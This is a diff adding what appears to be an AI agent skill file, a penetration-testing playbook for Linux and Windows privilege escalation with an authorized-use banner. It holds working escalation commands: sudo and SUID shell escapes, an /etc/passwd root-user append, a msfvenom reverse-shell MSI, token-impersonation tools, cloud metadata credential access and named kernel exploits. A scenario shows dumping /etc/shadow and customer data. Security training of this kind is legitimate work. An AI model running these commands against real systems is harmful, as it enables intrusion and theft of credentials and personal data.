@@ -1,0 +1,154 @@
+---
+name: performing-privilege-escalation-assessment
+description: Performs privilege escalation assessments on compromised Linux and Windows systems to identify paths from low-privilege access to root or SYSTEM-level control.
+subdomain: penetration-testing
+facing: config
+mitre_attack:
+- T1595
+- T1190
+- T1059
+- T1078
+- T1068
+nist_csf:
+- ID.RA-01
+- ID.RA-06
+- GV.OV-02
+- DE.AE-07
+upstream: performing-privilege-escalation-assessment@54a7988 Apache-2.0, modified by wesh
+---
+> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
+
+Not for: without written authorization, against production systems where exploitation could cause downtime, or for deploying kernel exploits on systems without prior approval and rollback capability.
+
+## Prerequisites
+
+- Low-privilege shell access (reverse shell, SSH, RDP) to target system obtained through authorized means
+- Privilege escalation enumeration scripts: linPEAS (Linux), winPEAS (Windows), Linux Smart Enumeration (LSE)
+- Compiled kernel exploits for common CVEs or access to compilation tools on target
+- GTFOBins reference for Linux SUID/sudo binary abuse and LOLBAS reference for Windows living-off-the-land binaries
+- Precompiled post-exploitation binaries for target architecture if compilation is not available on target
+
+## Workflow
+
+### Step 1: System Enumeration
+
+Gather comprehensive information about target system:
+
+**Linux Enumeration:**
+- `id && whoami` - Current user and group memberships
+- `uname -a` - Kernel version for kernel exploit identification
+- `cat /etc/os-release` - Distribution and version
+- `sudo -l` - Commands current user can run as root via sudo
+- `find / -perm -4000 -type f 2>/dev/null` - SUID binaries
+- `find / -perm -2000 -type f 2>/dev/null` - SGID binaries
+- `crontab -l && ls -la /etc/cron*` - Scheduled tasks running as root
+- `ps aux | grep root` - Processes running as root
+- `cat /etc/passwd` - User accounts (look for additional users with UID 0)
+- `find / -writable -type d 2>/dev/null` - World-writable directories
+- Run `linpeas.sh` for automated comprehensive enumeration
+
+**Windows Enumeration:**
+- `whoami /priv` - Current user privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)
+- `systeminfo` - OS version, hotfix level, architecture
+- `wmic service get name,pathname,startmode` - Unquoted service paths
+- `icacls "C:\Program Files" /T` - Writable directories in Program Files
+- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` - AlwaysInstallElevated check
+- `cmdkey /list` - Stored Windows credentials
+- `schtasks /query /fo LIST /v` - Scheduled tasks with their run-as accounts
+- Run `winPEAS.exe` for automated comprehensive enumeration
+
+### Step 2: Linux Privilege Escalation Vectors
+
+Test identified escalation vectors systematically:
+
+- **Sudo misconfigurations**: If `sudo -l` shows entries like `(ALL) NOPASSWD: /usr/bin/vim`, use GTFOBins to escalate:
+  - `sudo vim -c ':!/bin/bash'` to spawn root shell
+  - Common dangerous sudo entries: vim, less, find, nmap, python, perl, ruby, awk, env
+- **SUID binary abuse**: If SUID binary is identified that allows arbitrary command execution, shell escape, or file read:
+  - Custom SUID: Check if custom SUID binary calls other programs without absolute paths (PATH injection)
+  - Known SUID: Check GTFOBins for exploitation of standard SUID binaries
+- **Cron job exploitation**: If cron job runs script writable by current user, or runs script from writable directory:
+  - Modify script to add reverse shell or SUID copy of bash
+  - PATH-based cron exploitation: if cron job calls command without absolute path and PATH is writable
+- **Kernel exploits**: Match kernel version to known exploits:
+  - DirtyPipe (CVE-2022-0847): Linux kernel 5.8-5.16.11
+  - DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3
+  - PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions
+- **Capabilities abuse**: `getcap -r / 2>/dev/null` to find binaries with elevated capabilities (cap_setuid, cap_dac_override)
+- **Writable /etc/passwd**: If /etc/passwd is writable, add new root user: `echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`
+
+### Step 3: Windows Privilege Escalation Vectors
+
+Test Windows-specific escalation paths:
+
+- **Token impersonation**: If user has `SeImpersonatePrivilege` (common for service accounts and IIS):
+  - Use `JuicyPotato.exe`, `PrintSpoofer.exe`, or `GodPotato.exe` to impersonate SYSTEM
+  - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
+- **Unquoted service paths**: If service has unquoted path with spaces (e.g., `C:\Program Files\My App\service.exe`) and you can write to intermediate directory:
+  - Place malicious executable at `C:\Program Files\My.exe` which will execute when service restarts
+- **Writable service binaries**: If you can modify executable of service running as SYSTEM:
+  - Replace binary with reverse shell and restart service
+- **AlwaysInstallElevated**: If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1:
+  - Generate malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
+  - Install with elevated privileges: `msiexec /quiet /qn /i shell.msi`
+- **Stored credentials**: Check for credentials in `cmdkey /list`, AutoLogon registry keys, unattend.xml, web.config files, and PowerShell history
+- **DLL hijacking**: Identify services that load DLLs from writable directories. Use Process Monitor to find missing DLL loads, then place malicious DLL.
+- **Scheduled tasks**: Find tasks running as SYSTEM with writable scripts or binaries
+
+### Step 4: Container and Cloud Escalation
+
+Test for escalation paths in containerized and cloud environments:
+
+- **Docker breakout**: Check if container runs in privileged mode (`--privileged`), has Docker socket mounted (`/var/run/docker.sock`), or has `SYS_ADMIN` capability
+- **Kubernetes pod escalation**: Check for service account tokens with cluster-admin rights, hostPID/hostNetwork namespaces, or hostPath volume mounts
+- **Cloud metadata**: Access cloud instance metadata from compromised hosts (`http://169.254.169.254/latest/meta-data/`) to discover IAM roles, credentials, and instance information
+- **IAM role abuse**: If cloud credentials are discovered, enumerate IAM permissions and test for privilege escalation through IAM policy manipulation
+
+### Step 5: Documentation and Impact Assessment
+
+Document complete escalation path and business impact:
+
+- Record every command executed during escalation with timestamps
+- Capture proof of elevated access (whoami showing root/SYSTEM, accessing restricted files)
+- Document what data or systems become accessible at elevated privilege level
+- Map escalation technique to MITRE ATT&CK (T1548 - Abuse Elevation Control Mechanism, T1068 - Exploitation for Privilege Escalation)
+- Provide specific remediation for each identified escalation vector
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **SUID Binary** | Linux binary with Set User ID bit enabled, which executes with file owner's privileges (typically root) regardless of who runs it |
+| **SeImpersonatePrivilege** | Windows privilege that allows process to impersonate another user's security token, commonly abused by service accounts to escalate to SYSTEM |
+| **Kernel Exploit** | Exploit targeting vulnerability in operating system kernel to gain ring-0 or root/SYSTEM-level access |
+| **GTFOBins** | Curated list of Unix binaries that can be exploited for privilege escalation, file read/write, or shell escape when misconfigured |
+| **LOLBAS** | Living Off Land Binaries and Scripts; legitimate Windows binaries that can be abused for code execution, file operations, or persistence |
+| **DLL Hijacking** | Exploiting DLL search order on Windows to load malicious DLL by placing it in directory searched before legitimate DLL location |
+| **Token Impersonation** | Windows technique where compromised process with appropriate privileges captures and uses another user's access token to execute commands as that user |
+
+## Tools & Systems
+
+- **linPEAS / winPEAS**: Automated privilege escalation enumeration scripts that check hundreds of potential escalation vectors on Linux and Windows
+- **GTFOBins / LOLBAS**: Reference databases of Unix binaries and Windows binaries that can be exploited for privilege escalation when misconfigured
+- **PrintSpoofer / GodPotato**: Windows privilege escalation tools that exploit `SeImpersonatePrivilege` to achieve SYSTEM-level access from service accounts
+- **Linux Exploit Suggester**: Script that compares target kernel version against database of known kernel exploits to identify applicable exploits
+
+### Scenario: Privilege Escalation on Linux Web Server
+
+**Context**: During penetration test, tester gained low-privilege shell as `www-data` on Ubuntu 22.04 web server through PHP file upload vulnerability. Goal is to escalate to root to demonstrate full server compromise.
+
+**Approach**:
+1. Run `linpeas.sh` which identifies that `www-data` can run `/usr/bin/find` as root via sudo without password
+2. Verify with `sudo -l`: `(root) NOPASSWD: /usr/bin/find`
+3. Consult GTFOBins for the `find` sudo entry: `sudo find . -exec /bin/bash -p \; -quit`
+4. Execute command and obtain root shell
+5. As root, access `/etc/shadow` to extract password hashes, read database credentials from application configuration, and access MySQL database containing customer PII
+6. Document: initial access as www-data -> sudo misconfiguration -> root shell -> database access -> 75,000 customer records accessible
+
+**Pitfalls**:
+- Running kernel exploits without testing on similar system first, risking kernel panic and system crash
+- Not checking for container environments where apparent root access may be limited to container namespace
+- Ignoring cloud metadata endpoints accessible from compromised host that may yield IAM credentials
+- Failing to enumerate capabilities and SUID binaries after checking sudo, missing alternative escalation paths
+
+Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-privilege-escalation-assessment
